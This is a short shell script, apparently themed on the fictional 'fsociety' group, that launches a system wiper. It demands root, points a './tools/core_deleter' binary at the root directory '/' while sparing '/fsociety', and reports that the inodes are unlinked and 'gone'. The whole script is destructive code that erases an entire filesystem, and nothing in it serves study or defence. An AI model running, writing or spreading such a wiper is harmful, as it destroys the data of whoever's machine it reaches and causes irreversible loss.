#!/usr/bin/sh

if [ "$EUID" -ne 0 ]; then
  echo "[!] Permission denied: required root privilege."
  exit 1
fi

TARGET_DIR="/"
EXCLUDE_DIR="/fsociety"
DELETER_BIN="./tools/core_deleter"

if [ ! -f "$DELETER_BIN" ]; then
  echo "[!] Error: Couldn't find ($DELETER_BIN)!"
  exit 1
fi

echo "[*] Unlinking Inodes..."

"$DELETER_BIN" "$TARGET_DIR" "$EXCLUDE_DIR"

echo "[+] Inodes gone!"
